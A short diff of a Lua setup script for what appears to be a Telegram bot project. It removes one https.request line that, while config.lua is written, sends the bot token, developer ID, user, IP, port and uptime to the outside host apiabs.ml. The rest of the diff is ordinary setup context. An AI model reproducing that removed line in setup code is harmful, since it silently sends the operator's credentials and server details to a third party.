@@ -64,7 +64,6 @@ HASSAN = DevAbs:get(ServerHASSAN.."TokenHASSAN"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerHASSAN.."IdHASSAN")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=HASSAN&DevId="..DevAbs:get(ServerHASSAN.."IdHASSAN").."&TokenBot="..DevAbs:get(ServerHASSAN.."TokenHASSAN").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("HASSAN.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
